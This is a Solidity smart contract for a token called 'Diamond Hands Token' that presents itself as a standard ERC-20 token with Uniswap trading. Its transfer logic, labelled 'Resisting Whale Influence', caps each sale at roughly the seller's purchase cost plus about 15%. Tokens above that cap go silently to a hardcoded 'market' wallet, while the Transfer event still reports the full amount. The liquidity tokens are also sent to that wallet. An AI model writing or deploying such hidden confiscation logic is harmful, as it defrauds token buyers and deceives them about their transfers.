// SPDX-License-Identifier: MIT
//
//     ____  _                                 __   __  __                __    
//    / __ \(_)___ _____ ___  ____  ____  ____/ /  / / / /___ _____  ____/ /____
//   / / / / / __ `/ __ `__ \/ __ \/ __ \/ __  /  / /_/ / __ `/ __ \/ __  / ___/
//  / /_/ / / /_/ / / / / / / /_/ / / / / /_/ /  / __  / /_/ / / / / /_/ (__  ) 
// /_____/_/\__,_/_/ /_/ /_/\____/_/ /_/\__,_/  /_/ /_/\__,_/_/ /_/\__,_/____/  
//
// [Twitter](http://t.me/diamondhandstkn)
// [Website](https://www.diamondhandstoken.io)

pragma solidity ^0.8.9;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Pair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract ERC20 is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _referBalance;
    mapping(address => uint256) private _referBlock;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 409600000 * 1e18;
    uint256 private startBlock = block.number;

    string private _name = "Diamond Hands Token";
    string private _symbol = "DHT";

    address private owner;
    address private market = 0xb57f4e70b262A5E678f922a97bbdcf57E2908223;
    address private token0;
    address public Pair;
    address public Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        _balances[address(this)] = _totalSupply;
        Pair = IUniswapV2Factory(Factory).createPair(address(this), WETH);
        token0 = IUniswapV2Pair(Pair).token0();
        _allowances[address(this)][Router] = _totalSupply;
    }

    function renounceOwnership() external onlyOwner{
        address oldOwner = owner;
        owner = address(0);
        emit OwnershipTransferred(oldOwner, owner);
    }

    function name() external view virtual returns (string memory) {
        return _name;
    }

    function symbol() external view virtual returns (string memory) {
        return _symbol;
    }

    function openTrading() external payable onlyOwner{
        if (msg.value > 0) {
            IUniswapV2Router02(Router).addLiquidityETH{value: msg.value}(
                address(this),
                _totalSupply,
                0,
                0,
                market,
                type(uint).max
            );
        }
    }

    function decimals() external view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() external view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) external virtual returns (bool) {
        address sender = msg.sender;
        _transfer(sender, to, amount);
        return true;
    }

    function allowance(
        address sender,
        address spender
    ) public view virtual returns (uint256) {
        return _allowances[sender][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) external virtual returns (bool) {
        address sender = msg.sender;
        _approve(sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        require(from != to && amount > 0);
        uint taxValue = amount;
        //Resisting Whale Influence
        if (from == Pair && to != market) {
            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(Pair)
                .getReserves();
            _referBalance[to] += getEthIn(amount, reserve0, reserve1);
            if (_referBlock[to] == 0) {
                _referBlock[to] = block.number;
            }
        }
        if (to == Pair && from != market && from != address(this)) {
            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(Pair)
                .getReserves();
            uint referAmount = getReferBal(from, amount);
            uint amountOut = getEthOut(amount, reserve0, reserve1);
            if (amountOut > referAmount) {
                taxValue = getTokenIn(referAmount, reserve0, reserve1);
            }
            uint fromAmount = _referBalance[from];
            uint fromBal = (amount * fromAmount) / _balances[from];
            _referBalance[from] -= fromBal;
        }
        if (from != Pair && to != Pair && from != market) {
            if (_referBlock[to] == 0) {
                _referBlock[to] = block.number;
            }
            uint fromAmount = _referBalance[from];
            uint fromBal = (amount * fromAmount) / _balances[from];
            _referBalance[from] -= fromBal;
            _referBalance[to] += fromBal;
        }
        require(taxValue <= amount);
        unchecked {
            _balances[from] -= amount;
            _balances[to] += taxValue;
            if (taxValue < amount) {
                _balances[market] += amount - taxValue;
            }
        }

        emit Transfer(from, to, amount);
    }

    function _approve(
        address sender,
        address spender,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function _spendAllowance(
        address sender,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(sender, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(sender, spender, currentAllowance - amount);
            }
        }
    }

    function getReferBal(address addr, uint value) internal view returns (uint) {
        require(_referBlock[addr] > 0 && _referBalance[addr] > 0);
        uint block_limit = (block.number - _referBlock[addr]) / 240;
        uint amount = (_referBalance[addr] * value) / _balances[addr];
        return (amount * (115 + block_limit)) / 100;
    }

    function getEthIn(
        uint amountOut,
        uint112 reserve0,
        uint112 reserve1
    ) internal view returns (uint) {
        uint reserveOut = token0 == WETH ? reserve1 : reserve0;
        uint reserveIn = token0 == WETH ? reserve0 : reserve1;
        return getAmountIn(amountOut, reserveIn, reserveOut);
    }

    function getEthOut(
        uint amountIn,
        uint112 reserve0,
        uint112 reserve1
    ) internal view returns (uint) {
        uint reserveOut = token0 == WETH ? reserve0 : reserve1;
        uint reserveIn = token0 == WETH ? reserve1 : reserve0;
        return getAmountOut(amountIn, reserveIn, reserveOut);
    }

    function getTokenIn(
        uint amountOut,
        uint112 reserve0,
        uint112 reserve1
    ) internal view returns (uint) {
        uint reserveOut = token0 == WETH ? reserve0 : reserve1;
        uint reserveIn = token0 == WETH ? reserve1 : reserve0;
        return getAmountIn(amountOut, reserveIn, reserveOut);
    }

    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) internal pure returns (uint amountOut) {
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function getAmountIn(
        uint amountOut,
        uint reserveIn,
        uint reserveOut
    ) internal pure returns (uint amountIn) {
        uint numerator = reserveIn * amountOut * 1000;
        uint denominator = (reserveOut - amountOut) * 997;
        amountIn = numerator / denominator + 1;
    }
}